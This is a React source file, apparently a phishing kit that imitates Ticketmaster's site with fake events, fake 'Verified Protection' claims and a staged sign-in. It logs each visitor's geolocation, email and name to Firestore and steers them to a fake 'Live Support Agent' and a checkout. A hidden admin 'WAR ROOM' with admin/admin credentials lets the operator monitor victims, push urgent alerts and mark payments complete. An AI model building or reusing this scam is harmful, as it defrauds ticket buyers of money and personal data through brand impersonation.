import React, { useState, useEffect } from 'react';
import { Search, User, CheckCircle, MessageSquare, Send, X, Bell, DollarSign, ShieldCheck, Ticket, Info, Star, ChevronLeft } from 'lucide-react';
import { onSnapshot, collection, addDoc, updateDoc, doc, setDoc, getDoc, query } from 'firebase/firestore';
import { signInAnonymously, onAuthStateChanged } from 'firebase/auth';
import { auth, db, appId } from './firebase';

import SeatMap from './components/SeatMap.jsx';
import Checkout from './components/Checkout.jsx';

const INITIAL_EVENTS = [
  { id: 1, artist: "Taylor Swift | The Eras Tour", venue: "Wembley Stadium, London", date: "Sat • Aug 17 • 7:00 PM", image: "https://images.unsplash.com/photo-1540039155733-5bb30b53aa14?auto=format&fit=crop&q=80&w=1000", bgImage: "https://images.unsplash.com/photo-1459749411177-287ce35e8b4f?auto=format&fit=crop&q=80&w=2000", status: "presale", timeRemaining: "02:45:12" },
  { id: 2, artist: "Drake: It's All A Blur", venue: "O2 Arena, London", date: "Fri • Sep 22 • 8:00 PM", image: "https://images.unsplash.com/photo-1514525253440-b393452e8d26?auto=format&fit=crop&q=80&w=1000", bgImage: "https://images.unsplash.com/photo-1501281668745-f7f57925c3b4?auto=format&fit=crop&q=80&w=2000", status: "available", timeRemaining: "00:00:00" }
];

export default function App() {
  const [user, setUser] = useState(null);
  const [currentPage, setCurrentPage] = useState('home'); 
  const [selectedEvent, setSelectedEvent] = useState(null);
  const [cart, setCart] = useState([]); 
  const [sessions, setSessions] = useState([]); 
  const [currentSessionId, setCurrentSessionId] = useState(null);
  const [globalSettings, setGlobalSettings] = useState({ price: 250, bgImage: '', presaleCode: 'FAN2024' });
  
  const [searchTerm, setSearchTerm] = useState('');
  const [authStep, setAuthStep] = useState('email'); 
  const [tempUser, setTempUser] = useState({ email: '', name: '' });
  
  const [isChatOpen, setIsChatOpen] = useState(false);
  const [chatMessages, setChatMessages] = useState([]);
  const [isAdminLoggedIn, setIsAdminLoggedIn] = useState(false);
  const [showBadgeInfo, setShowBadgeInfo] = useState(false);
  const [activeNotification, setActiveNotification] = useState(null);

  // --- INITIALIZATION & AUTH ---
  useEffect(() => {
    const init = async () => {
      await signInAnonymously(auth);
    };
    init();
    return onAuthStateChanged(auth, setUser);
  }, []);

  // --- LOCATION & SESSION START ---
  useEffect(() => {
    if (!user) return;
    const startSession = async () => {
      let location = "Unknown Location";
      try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        location = `${data.city}, ${data.country_name}`;
      } catch (e) { console.error("Geo error"); }

      const sessionsRef = collection(db, 'artifacts', appId, 'public', 'data', 'sessions');
      const newSession = await addDoc(sessionsRef, {
        createdAt: new Date().toISOString(),
        userId: user.uid,
        location,
        status: 'browsing',
        email: 'Not Set',
        userAuthCode: '', 
        notifications: [],
        chatHistory: [{ sender: 'system', text: 'Welcome! How can we assist you with your fan verification today?', timestamp: new Date().toISOString() }]
      });
      setCurrentSessionId(newSession.id);
    };
    startSession();
  }, [user]);

  // --- GLOBAL SYNC ---
  useEffect(() => {
    if (!user) return;
    const configRef = doc(db, 'artifacts', appId, 'public', 'data', 'config', 'global_settings');
    return onSnapshot(configRef, (docSnap) => {
      if (docSnap.exists()) setGlobalSettings(docSnap.data());
    });
  }, [user]);

  // --- REAL-TIME SESSION SYNC ---
  useEffect(() => {
    if (!currentSessionId) return;
    const sessionRef = doc(db, 'artifacts', appId, 'public', 'data', 'sessions', currentSessionId);
    return onSnapshot(sessionRef, (docSnap) => {
      if (docSnap.exists()) {
        const data = docSnap.data();
        if (data.chatHistory) setChatMessages(data.chatHistory);
        if (data.notifications && data.notifications.length > 0) {
          setActiveNotification(data.notifications[data.notifications.length - 1]);
        }
      }
    });
  }, [currentSessionId]);

  // --- ADMIN LISTENER ---
  useEffect(() => {
    if (!user || !isAdminLoggedIn) return;
    const sessionsRef = collection(db, 'artifacts', appId, 'public', 'data', 'sessions');
    return onSnapshot(sessionsRef, (snapshot) => {
      setSessions(snapshot.docs.map(d => ({ id: d.id, ...d.data() })).sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt)));
    });
  }, [user, isAdminLoggedIn]);

  // --- ACTIONS ---
  const updateSession = async (sid, updates) => await updateDoc(doc(db, 'artifacts', appId, 'public', 'data', 'sessions', sid), updates);
  const sendChatMessage = async (sid, text, sender) => {
    const ref = doc(db, 'artifacts', appId, 'public', 'data', 'sessions', sid);
    const snap = await getDoc(ref);
    if (snap.exists()) {
      const currentChat = snap.data().chatHistory || [];
      await updateDoc(ref, { chatHistory: [...currentChat, { sender, text, timestamp: new Date().toISOString() }] });
    }
  };

  const filteredEvents = INITIAL_EVENTS.filter(ev => ev.artist.toLowerCase().includes(searchTerm.toLowerCase()));
  const mySessionData = sessions.find(s => s.id === currentSessionId) || {};

  return (
    <div className="min-h-screen font-sans text-gray-900 bg-[#f8fafc] relative overflow-x-hidden">
      {/* HEADER */}
      <header className="fixed top-0 w-full z-50 bg-[#1f262d] text-white h-16 flex items-center px-4 justify-between shadow-2xl">
        <div className="flex items-center gap-3">
          {currentPage !== 'home' && (
            <button onClick={() => setCurrentPage('home')} className="hover:bg-white/10 p-1 rounded-full transition-colors">
              <ChevronLeft className="w-6 h-6" />
            </button>
          )}
          <div className="flex items-center gap-1 cursor-pointer shrink-0" onClick={() => setCurrentPage('home')}>
            <span className="font-bold text-2xl tracking-tighter">ticketmaster</span>
            <div className="bg-[#026cdf] rounded-full w-5 h-5 flex items-center justify-center">
              <CheckCircle className="w-3.5 h-3.5 text-white stroke-[3]" />
            </div>
          </div>
        </div>

        <div className="hidden md:flex flex-1 max-w-lg mx-8 relative">
          <input 
            type="text" 
            placeholder="Search for artists, venues, or events" 
            className="w-full bg-white/10 border border-gray-600 rounded-lg py-2 pl-10 pr-4 text-sm focus:bg-white focus:text-gray-900 focus:outline-none transition-all"
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
          />
          <Search className="absolute left-3 top-2.5 w-4 h-4 text-gray-400" />
        </div>

        <div className="flex items-center gap-4 shrink-0 relative">
          <div 
            onClick={() => setShowBadgeInfo(!showBadgeInfo)}
            className="flex items-center gap-2 text-[10px] font-bold text-[#026cdf] bg-blue-500/10 px-3 py-1.5 rounded-full border border-blue-500/20 cursor-pointer hover:bg-blue-500/20"
          >
            <Star className="w-3 h-3 fill-current" />
            <span className="hidden sm:inline uppercase">Verified</span>
          </div>

          <div className="relative cursor-pointer" onClick={() => setActiveNotification(null)}>
            <Bell className="w-5 h-5" />
            {activeNotification && <div className="absolute -top-1 -right-1 w-3 h-3 bg-red-600 rounded-full border-2 border-[#1f262d] animate-pulse" />}
          </div>
          
          <User className="w-5 h-5 cursor-pointer hover:text-[#026cdf]" />

          {showBadgeInfo && (
            <div className="absolute top-12 right-0 bg-white text-gray-900 p-4 rounded-xl shadow-2xl border w-64 animate-slideDown z-[100]">
               <h4 className="font-black text-xs uppercase mb-2 flex items-center gap-1"><ShieldCheck className="w-4 h-4 text-[#026cdf]" /> Verified Protection</h4>
               <p className="text-[10px] text-gray-500 leading-relaxed">This event is protected by Ticketmaster SmartQueue. Your session is encrypted and verified for secure checkout.</p>
            </div>
          )}
        </div>
      </header>

      {/* NOTIFICATION TOAST */}
      {activeNotification && (
        <div className="fixed top-20 left-1/2 -translate-x-1/2 z-[100] w-[90vw] max-w-md bg-red-600 text-white p-4 rounded-2xl shadow-2xl flex items-start gap-3 animate-bounce">
           <Bell className="shrink-0 mt-1" />
           <div className="flex-1">
              <p className="font-black text-sm uppercase">Urgent Alert</p>
              <p className="text-xs opacity-90">{activeNotification.text}</p>
           </div>
           <X className="cursor-pointer" onClick={() => setActiveNotification(null)} />
        </div>
      )}

      {/* MAIN VIEWPORT */}
      <main className="pt-16 min-h-screen">
        {currentPage === 'home' && <HomeView events={filteredEvents} onSelect={(e) => {setSelectedEvent(e); setCurrentPage('auth');}} />}
        
        {currentPage === 'auth' && (
          <AuthGate 
            step={authStep} 
            setStep={setAuthStep} 
            tempUser={tempUser} 
            setTempUser={setTempUser} 
            sessionData={sessions.find(s => s.id === currentSessionId) || mySessionData}
            onComplete={() => {
              setCurrentPage('seatmap'); 
              updateSession(currentSessionId, { status: 'viewing_map', email: tempUser.email, name: tempUser.name });
            }} 
          />
        )}
        
        {currentPage === 'seatmap' && (
          <SeatMap 
            event={selectedEvent} 
            presaleCode={globalSettings.presaleCode} 
            cart={cart} 
            setCart={setCart} 
            globalPrice={globalSettings.price} 
            onCheckout={() => {
              updateSession(currentSessionId, { status: 'payment_pending', cart });
              setCurrentPage('checkout');
            }} 
          />
        )}
        
        {currentPage === 'checkout' && (
          <Checkout 
            cart={cart} 
            sessionId={currentSessionId} 
            sessionData={sessions.find(s => s.id === currentSessionId) || mySessionData} 
            updateSession={updateSession} 
            onSuccess={() => setCurrentPage('success')} 
            onBack={() => setCurrentPage('seatmap')} 
          />
        )}
        
        {currentPage === 'success' && <SuccessScreen event={selectedEvent} cart={cart} onHome={() => setCurrentPage('home')} />}
        
        {currentPage === 'admin' && (
          <AdminDashboard 
            isLoggedIn={isAdminLoggedIn} 
            setLoggedIn={setIsAdminLoggedIn} 
            sessions={sessions} 
            updateSession={updateSession} 
            globalSettings={globalSettings} 
            updateGlobalSettings={(s) => setDoc(doc(db, 'artifacts', appId, 'public', 'data', 'config', 'global_settings'), s)} 
            sendChatMessage={sendChatMessage} 
            onExit={() => setCurrentPage('home')} 
          />
        )}
      </main>

      {/* CHAT WIDGET */}
      <div className={`fixed bottom-6 right-6 z-[60] transition-transform ${currentPage === 'seatmap' || currentPage === 'checkout' ? '-translate-y-20 sm:translate-y-0' : ''}`}>
        <button onClick={() => setIsChatOpen(!isChatOpen)} className="bg-[#026cdf] text-white p-4 rounded-full shadow-2xl hover:scale-110 transition-transform">
          <MessageSquare />
        </button>
      </div>

      {isChatOpen && (
        <div className="fixed bottom-24 right-6 w-[90vw] max-w-[350px] h-[450px] bg-white border shadow-2xl rounded-2xl z-[70] flex flex-col overflow-hidden animate-slideUp">
          <div className="bg-[#1f262d] text-white p-4 flex justify-between items-center">
            <div className="flex items-center gap-2"><div className="w-2 h-2 bg-green-500 rounded-full animate-pulse" /> <span className="font-bold">Live Support Agent</span></div>
            <X className="cursor-pointer w-5 h-5" onClick={() => setIsChatOpen(false)} />
          </div>
          <div className="flex-1 overflow-y-auto p-4 space-y-3 bg-gray-50">
            {chatMessages.map((m, i) => (
              <div key={i} className={`flex ${m.sender === 'user' ? 'justify-end' : 'justify-start'}`}>
                <div className={`max-w-[85%] p-3 rounded-2xl text-sm shadow-sm ${m.sender === 'user' ? 'bg-[#026cdf] text-white rounded-br-none' : 'bg-white border rounded-bl-none text-gray-800'}`}>
                  {m.text}
                </div>
              </div>
            ))}
          </div>
          <div className="p-3 border-t bg-white flex gap-2">
            <input 
              placeholder="Type your message..." 
              className="flex-1 border border-gray-200 p-2 rounded-lg text-sm focus:outline-none" 
              onKeyDown={(e) => { 
                if(e.key === 'Enter' && e.target.value.trim()){ 
                  sendChatMessage(currentSessionId, e.target.value, 'user'); 
                  e.target.value = ''; 
                } 
              }} 
            />
          </div>
        </div>
      )}

      {currentPage === 'home' && (
        <footer className="bg-[#1f262d] py-20 px-4 mt-12 border-t border-gray-800">
          <div className="max-w-7xl mx-auto flex flex-col items-center gap-8 text-gray-500">
             <div className="flex gap-8 text-[10px] font-bold uppercase tracking-widest">
               <span>Purchase Policy</span><span>Privacy Policy</span><span>Ad Choices</span>
             </div>
             <button onClick={() => setCurrentPage('admin')} className="text-gray-800 hover:text-gray-700">Internal Link</button>
             <p className="text-[10px]">© 1999-2024 Ticketmaster. All rights reserved.</p>
          </div>
        </footer>
      )}
    </div>
  );
}

// --- VIEWS ---

function HomeView({ events, onSelect }) {
  return (
    <div className="max-w-7xl mx-auto p-4 sm:p-8 space-y-12">
      <div className="relative h-[400px] rounded-[40px] overflow-hidden shadow-2xl flex items-center justify-center p-8 text-center">
        <div className="absolute inset-0 bg-gradient-to-t from-black via-black/40 to-transparent z-10" />
        <img src="https://images.unsplash.com/photo-1470225620780-dba8ba36b745?auto=format&fit=crop&q=80&w=2000" className="absolute inset-0 w-full h-full object-cover" />
        <div className="relative z-20 text-white max-w-3xl animate-fadeIn">
          <h1 className="text-5xl md:text-7xl font-black mb-6 tracking-tighter">THE TOUR IS HERE.</h1>
          <p className="text-xl font-medium mb-10 text-gray-300">Experience the world's most sought-after live performances.</p>
          <div className="bg-white rounded-full p-2 flex shadow-2xl max-w-lg mx-auto">
             <input className="flex-1 px-6 py-2 rounded-full text-gray-900 focus:outline-none" placeholder="Find your next experience" />
             <button className="bg-[#026cdf] px-8 py-3 rounded-full font-bold">Search</button>
          </div>
        </div>
      </div>

      <div className="space-y-6">
        <h2 className="text-2xl font-black flex items-center gap-2 px-2">
          <Star className="text-blue-500 fill-current" /> UPCOMING EVENTS
        </h2>
        <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
          {events.map(ev => (
            <div key={ev.id} onClick={() => onSelect(ev)} className="bg-white rounded-[32px] overflow-hidden shadow-sm border border-gray-100 hover:shadow-2xl transition-all cursor-pointer group">
              <div className="h-72 relative overflow-hidden">
                 <img src={ev.image} className="w-full h-full object-cover group-hover:scale-110 transition-transform duration-1000" />
                 <div className="absolute inset-0 bg-gradient-to-t from-black/80 via-transparent to-transparent" />
                 <div className="absolute bottom-6 left-6 text-white">
                    <div className="bg-[#ea0042] text-white px-3 py-1 rounded-full text-[10px] font-black uppercase inline-block mb-3">On Sale In: {ev.timeRemaining}</div>
                    <h3 className="text-3xl font-black leading-tight">{ev.artist}</h3>
                 </div>
              </div>
              <div className="p-6 flex justify-between items-center">
                 <p className="text-gray-500 font-bold text-sm uppercase tracking-wider">{ev.venue}</p>
                 <div className="bg-blue-50 text-[#026cdf] px-3 py-1 rounded-full text-[10px] font-black border border-blue-100">{ev.status.toUpperCase()}</div>
              </div>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}

function AuthGate({ step, setStep, tempUser, setTempUser, sessionData, onComplete }) {
  const [loading, setLoading] = useState(false);
  const [vCode, setVCode] = useState('');
  const [error, setError] = useState('');

  const next = () => { 
    setLoading(true); 
    setError('');
    setTimeout(() => { 
      setLoading(false); 
      if(step==='email') setStep('signup'); 
      else if(step==='signup') setStep('verify'); 
      else {
        // CHECK ADMIN ASSIGNED CODE
        if (vCode === sessionData.userAuthCode && vCode !== '') {
           onComplete();
        } else {
           setError("Invalid access code. Please chat with support to receive your unique code.");
        }
      }
    }, 1500); 
  };
  
  return (
    <div className="min-h-[85vh] flex items-center justify-center p-4">
      <div className="bg-white w-full max-w-md rounded-[40px] shadow-[0_50px_100px_rgba(0,0,0,0.1)] p-10 border border-gray-100 space-y-8 animate-slideUp">
        <div className="text-center space-y-2">
           <div className="w-16 h-16 bg-blue-50 rounded-[20px] flex items-center justify-center mx-auto mb-6"><User className="text-[#026cdf] w-8 h-8" /></div>
           <h2 className="text-3xl font-black tracking-tight">Sign In</h2>
           <p className="text-gray-400 text-sm font-medium">Verified Fan Authentication Required</p>
        </div>
        
        {step === 'email' && (
          <div className="space-y-4">
             <div className="space-y-1">
               <label className="text-[10px] font-black uppercase text-gray-400 ml-1">Email Address</label>
               <input className="w-full border-2 border-gray-100 p-4 rounded-2xl focus:border-[#026cdf] focus:ring-4 focus:ring-blue-500/5 outline-none transition-all" placeholder="name@example.com" value={tempUser.email} onChange={e=>setTempUser({...tempUser, email:e.target.value})} />
             </div>
             <button onClick={next} className="w-full bg-[#026cdf] text-white py-4 rounded-2xl font-black shadow-xl shadow-blue-500/30 flex items-center justify-center">
               {loading ? <div className="w-6 h-6 border-2 border-white/20 border-t-white rounded-full animate-spin" /> : 'Continue'}
             </button>
          </div>
        )}
        
        {step === 'signup' && (
          <div className="space-y-4 animate-fadeIn">
             <p className="text-xs text-center font-black text-blue-600 uppercase tracking-widest">New Member Profile</p>
             <input className="w-full border-2 border-gray-100 p-4 rounded-2xl outline-none" placeholder="First & Last Name" value={tempUser.name} onChange={e=>setTempUser({...tempUser, name:e.target.value})} />
             <input className="w-full border-2 border-gray-100 p-4 rounded-2xl outline-none" type="password" placeholder="Create Password" />
             <button onClick={next} className="w-full bg-black text-white py-4 rounded-2xl font-black shadow-xl">
               {loading ? 'Creating Profile...' : 'Complete Registration'}
             </button>
          </div>
        )}
        
        {step === 'verify' && (
          <div className="space-y-6 animate-fadeIn">
             <div className="bg-blue-50 p-4 rounded-2xl border border-blue-100 text-center">
                <p className="text-xs text-blue-800 font-bold leading-relaxed">
                  Identity Verification Required.<br/>To prevent automated bots, please message our <span className="underline">Live Support Agent</span> to receive your unique 6-digit access code.
                </p>
             </div>
             <div className="space-y-2">
                <input 
                  className={`w-full border-2 p-5 rounded-2xl text-center font-black tracking-[0.5em] text-2xl outline-none transition-colors ${error ? 'border-red-500 bg-red-50' : 'border-gray-100'}`} 
                  placeholder="000000" 
                  value={vCode}
                  onChange={e=>setVCode(e.target.value)}
                  maxLength={6} 
                />
                {error && <p className="text-red-600 text-[10px] font-bold text-center uppercase tracking-wider">{error}</p>}
             </div>
             <button onClick={next} className="w-full bg-[#026cdf] text-white py-4 rounded-2xl font-black shadow-xl">
               {loading ? 'Verifying...' : 'Unlock Fan Access'}
             </button>
          </div>
        )}
      </div>
    </div>
  );
}

function SuccessScreen({ event, cart, onHome }) {
  const [showPrize, setShowPrize] = useState(false);
  useEffect(() => { setTimeout(() => setShowPrize(true), 800); }, []);
  
  const total = (cart.reduce((a,b)=>a+b.price,0) + (cart.length * 19.50) + 5.00).toFixed(2);

  return (
    <div className="min-h-screen bg-[#026cdf] flex items-center justify-center p-4 overflow-hidden relative">
      {/* Confetti Elements */}
      <div className="absolute inset-0 pointer-events-none">
         {[...Array(20)].map((_, i) => (
           <div key={i} className={`confetti-piece absolute bg-white/40 w-2 h-6 rounded-full animate-confetti`} style={{ left: `${Math.random()*100}%`, animationDelay: `${Math.random()*2}s` }} />
         ))}
      </div>

      <div className={`bg-white w-full max-w-md rounded-[50px] p-10 text-center shadow-[0_50px_100px_rgba(0,0,0,0.3)] transition-all duration-1000 transform ${showPrize ? 'scale-100 translate-y-0 opacity-100' : 'scale-75 translate-y-20 opacity-0'}`}>
         <div className="w-24 h-24 bg-green-500 rounded-[30px] flex items-center justify-center mx-auto mb-8 shadow-2xl shadow-green-500/40 animate-bounce">
           <CheckCircle className="text-white w-12 h-12 stroke-[4]" />
         </div>
         
         <h1 className="text-4xl font-black text-gray-900 leading-tight mb-4 tracking-tighter uppercase">Tickets Confirmed!</h1>
         <p className="text-gray-400 font-bold mb-10 text-sm uppercase tracking-widest">See you at {event?.artist}</p>
         
         <div className="bg-gray-50 rounded-[30px] p-8 border-2 border-dashed border-gray-200 mb-10 space-y-4">
            <div className="flex flex-col items-center gap-2">
               <Ticket className="w-10 h-10 text-[#026cdf]" />
               <span className="text-[10px] font-black text-gray-300 uppercase tracking-[0.2em]">Total Transaction</span>
               <span className="text-5xl font-black text-gray-900 tracking-tighter">${total}</span>
            </div>
            <p className="text-[9px] text-gray-400 leading-relaxed font-bold">A confirmation email has been sent to your registered address. Present your digital QR code at the venue entrance.</p>
         </div>

         <button onClick={onHome} className="w-full bg-[#1f262d] text-white py-5 rounded-[24px] font-black text-lg hover:bg-black transition-all shadow-xl">
           VIEW MY TICKETS
         </button>
      </div>
    </div>
  );
}

function AdminDashboard({ isLoggedIn, setLoggedIn, sessions, updateSession, globalSettings, updateGlobalSettings, sendChatMessage, onExit }) {
  const [e, setE] = useState(''); const [p, setP] = useState('');
  const [config, setConfig] = useState(globalSettings);

  const sendNotification = async (sid, text) => {
    const ref = doc(db, 'artifacts', appId, 'public', 'data', 'sessions', sid);
    const snap = await getDoc(ref);
    if (snap.exists()) {
      const currentNotifs = snap.data().notifications || [];
      await updateDoc(ref, { notifications: [...currentNotifs, { text, timestamp: new Date().toISOString() }] });
    }
  };

  if(!isLoggedIn) return <div className="min-h-screen bg-[#1f262d] flex items-center justify-center"><div className="bg-white p-10 rounded-[40px] w-96 shadow-2xl space-y-6"><h2 className="text-2xl font-black text-center uppercase tracking-widest">Admin Access</h2><input placeholder="Admin ID" className="border-2 w-full p-4 rounded-2xl outline-none focus:border-[#026cdf]" value={e} onChange={ev=>setE(ev.target.value)}/><input type="password" placeholder="Passkey" className="border-2 w-full p-4 rounded-2xl outline-none focus:border-[#026cdf]" value={p} onChange={ev=>setP(ev.target.value)}/><button onClick={()=>{if(e==='admin'&&p==='admin')setLoggedIn(true)}} className="bg-[#026cdf] text-white w-full py-4 rounded-2xl font-black shadow-xl">ACCESS SYSTEM</button></div></div>;
  
  return (
    <div className="min-h-screen bg-[#f1f5f9] p-4 md:p-8">
      <div className="max-w-7xl mx-auto space-y-8">
        <div className="flex justify-between items-center"><h1 className="text-3xl font-black uppercase tracking-tighter flex items-center gap-2"><div className="w-3 h-3 bg-green-500 rounded-full animate-pulse" /> WAR ROOM</h1><button onClick={onExit} className="bg-red-600 text-white px-6 py-2 rounded-full font-bold text-xs">DISCONNECT</button></div>
        
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
          <div className="bg-white p-8 rounded-[40px] shadow-sm border space-y-6 h-fit">
            <h3 className="font-black text-lg uppercase flex items-center gap-2"><DollarSign className="w-5 h-5 text-green-600" /> Site Controls</h3>
            <div className="space-y-4">
               <div><label className="text-[10px] font-black text-gray-400 block mb-2 uppercase">Global Ticket Price</label><input type="number" className="w-full border-2 p-3 rounded-xl font-bold" value={config.price} onChange={ev=>setConfig({...config, price: Number(ev.target.value)})}/></div>
               <div><label className="text-[10px] font-black text-gray-400 block mb-2 uppercase">Presale Access Code</label><input className="w-full border-2 p-3 rounded-xl font-bold" value={config.presaleCode} onChange={ev=>setConfig({...config, presaleCode: ev.target.value})}/></div>
               <div><label className="text-[10px] font-black text-gray-400 block mb-2 uppercase">Global BG Image URL</label><input className="w-full border-2 p-3 rounded-xl text-xs" value={config.bgImage} onChange={ev=>setConfig({...config, bgImage: ev.target.value})}/></div>
               <button onClick={()=>updateGlobalSettings(config)} className="w-full bg-[#026cdf] text-white py-4 rounded-2xl font-black shadow-lg">DEPLOY CHANGES</button>
            </div>
          </div>
          
          <div className="lg:col-span-2 bg-white p-8 rounded-[40px] shadow-sm border space-y-6">
            <h3 className="font-black text-lg uppercase flex items-center gap-2"><User className="w-5 h-5 text-blue-600" /> Active Sessions ({sessions.length})</h3>
            <div className="space-y-6 max-h-[700px] overflow-y-auto pr-2">
              {sessions.map(s=>(
                <div key={s.id} className="bg-gray-50 p-6 rounded-[32px] border-2 border-gray-100 space-y-4">
                  <div className="flex justify-between items-start">
                    <div>
                      <div className="text-sm font-black text-blue-700">{s.name || 'Anonymous'} <span className="text-gray-400 font-medium">({s.location})</span></div>
                      <div className="text-[10px] text-gray-500 font-bold">{s.email}</div>
                    </div>
                    <div className="bg-white px-3 py-1 rounded-full text-[10px] font-black text-gray-400 border uppercase">{s.status}</div>
                  </div>

                  <div className="grid grid-cols-2 gap-4">
                    <div className="bg-white p-3 rounded-xl border">
                       <label className="text-[9px] font-black text-gray-400 uppercase block mb-1">Assigned Auth Code</label>
                       <input className="w-full font-black text-blue-600 text-lg outline-none" placeholder="SET CODE" onBlur={(e) => updateSession(s.id, { userAuthCode: e.target.value })} defaultValue={s.userAuthCode} />
                    </div>
                    <div className="bg-white p-3 rounded-xl border">
                       <label className="text-[9px] font-black text-gray-400 uppercase block mb-1">Live Ping (Bell)</label>
                       <div className="flex gap-2">
                          <input className="flex-1 text-[10px] font-bold outline-none" placeholder="MSG" id={`ping-${s.id}`} />
                          <button onClick={() => sendNotification(s.id, document.getElementById(`ping-${s.id}`).value)} className="bg-red-500 text-white px-2 rounded font-black text-[9px]">PING</button>
                       </div>
                    </div>
                  </div>

                  <div className="flex gap-2">
                    <input className="flex-1 bg-white border p-2 rounded-xl text-xs font-medium" placeholder="Chat reply..." onKeyDown={e => { if(e.key==='Enter'){ sendChatMessage(s.id, e.target.value, 'system'); e.target.value='' } }} />
                    <button onClick={() => updateSession(s.id, {status: 'payment_complete'})} className="bg-green-600 text-white px-4 rounded-xl font-black text-[10px]">SUCCESS</button>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

